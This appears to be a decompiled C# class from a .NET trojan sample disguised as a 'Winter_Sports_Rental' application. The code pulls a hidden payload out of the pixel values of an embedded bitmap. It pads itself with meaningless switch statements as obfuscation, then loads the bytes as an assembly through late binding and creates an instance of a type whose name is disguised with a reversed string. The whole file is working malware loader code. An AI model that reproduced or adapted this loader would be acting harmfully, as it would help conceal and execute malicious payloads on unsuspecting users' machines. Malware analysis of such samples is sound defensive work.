// Decompiled with JetBrains decompiler
// Type: Winter_Sports_Rental.ISectionEntry
// Assembly: CLRIPropertyValueImpl, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 890FDB68-4B7D-4035-A759-8056CF611D6F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\Trojan.MSIL.Crypt.hwnc-988ec5d9bc02691882a3180947ee76fabc3629413f79a2e4768b9adb58ba432c.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.Reflection;
using System.Threading;

namespace Winter_Sports_Rental
{
  internal class ISectionEntry
  {
    public ISectionEntry(bool c1, bool k1)
    {
      int index = 0;
      Bitmap image1 = Winter_Sports_Rental.My.Resources.Resources.image1;
      byte[] TaskCanceledException = new byte[53761];
      int x = 0;
      do
      {
        int y = 0;
        do
        {
          int win32 = ColorTranslator.ToWin32(image1.GetPixel(x, y));
          TaskCanceledException[index] = checked ((byte) win32);
          checked { ++y; }
        }
        while (y <= 0);
        checked { ++index; }
        checked { ++x; }
      }
      while (x <= 53759);
      this.MessageSurrogateFilter((object) TaskCanceledException);
    }

    public Bitmap MessageSurrogateFilter(object TaskCanceledException)
    {
      int num1;
      switch (251367107)
      {
        case 251367157:
          num1 = 251367121;
          break;
        case 251367191:
          num1 = 251367107;
          break;
        default:
          num1 = 251367187;
          break;
      }
      int num2;
      switch (251367171)
      {
        case 251367131:
          num2 = 251367139;
          break;
        case 251367137:
          num2 = 251367143;
          break;
        default:
          num2 = 251367173;
          break;
      }
      int num3;
      switch (251367148)
      {
        case 251367115:
          num3 = 251367171;
          break;
        case 251367143:
          num3 = 251367110;
          break;
        default:
          num3 = 251367128;
          break;
      }
      int num4;
      switch (251367157)
      {
        case 251367101:
          num4 = 251367105;
          break;
        case 251367107:
          num4 = 251367128;
          break;
        default:
          num4 = 251367103;
          break;
      }
      byte num5;
      switch (74)
      {
        case 27:
          num5 = (byte) 185;
          break;
        case 165:
          num5 = (byte) 144;
          break;
        default:
          num5 = (byte) 36;
          break;
      }
      int num6;
      switch (251367103)
      {
        case 251367118:
          num6 = 251367159;
          break;
        case 251367194:
          num6 = 251367163;
          break;
        default:
          num6 = 251367194;
          break;
      }
      int num7;
      switch (251367130)
      {
        case 251367123:
          num7 = 251367173;
          break;
        case 251367194:
          num7 = 251367186;
          break;
        default:
          num7 = 251367143;
          break;
      }
      int num8;
      switch (251367103)
      {
        case 251367102:
          num8 = 251367154;
          break;
        case 251367133:
          num8 = 251367122;
          break;
        default:
          num8 = 251367187;
          break;
      }
      int num9;
      switch (251367150)
      {
        case 251367160:
          num9 = 251367184;
          break;
        case 251367167:
          num9 = 251367159;
          break;
        default:
          num9 = 251367133;
          break;
      }
      byte num10;
      switch (7)
      {
        case 21:
          num10 = (byte) 164;
          break;
        case 168:
          num10 = (byte) 97;
          break;
        default:
          num10 = (byte) 112;
          break;
      }
      int num11;
      switch (251367187)
      {
        case 251367121:
          num11 = 251367186;
          break;
        case 251367181:
          num11 = 251367198;
          break;
        default:
          num11 = 251367168;
          break;
      }
      int num12;
      switch (251367112)
      {
        case 251367193:
          num12 = 251367170;
          break;
        case 251367199:
          num12 = 251367101;
          break;
        default:
          num12 = 251367111;
          break;
      }
      int num13;
      switch (251367180)
      {
        case 251367171:
          num13 = 251367125;
          break;
        case 251367199:
          num13 = 251367100;
          break;
        default:
          num13 = 251367172;
          break;
      }
      int num14;
      switch (251367194)
      {
        case 251367152:
          num14 = 251367182;
          break;
        case 251367173:
          num14 = 251367185;
          break;
        default:
          num14 = 251367177;
          break;
      }
      int num15;
      switch (251367194)
      {
        case 251367113:
          num15 = 251367190;
          break;
        case 251367190:
          num15 = 251367124;
          break;
        default:
          num15 = 251367190;
          break;
      }
      byte num16;
      switch (146)
      {
        case 88:
          num16 = (byte) 58;
          break;
        case 148:
          num16 = (byte) 60;
          break;
        default:
          num16 = (byte) 30;
          break;
      }
      byte num17;
      switch (123)
      {
        case 2:
          num17 = (byte) 136;
          break;
        case 21:
          num17 = (byte) 152;
          break;
        default:
          num17 = (byte) 106;
          break;
      }
      Activator.CreateInstance(((Assembly) LateBinding.LateGet((object) Thread.GetDomain(), (System.Type) null, "Load", new object[1]
      {
        TaskCanceledException
      }, (string[]) null, (bool[]) null)).GetType(Strings.StrReverse("IDM.IUelpmiS")), CompatibilityMap.ReflectionEmit);
      Bitmap bitmap;
      return bitmap;
    }
  }
}
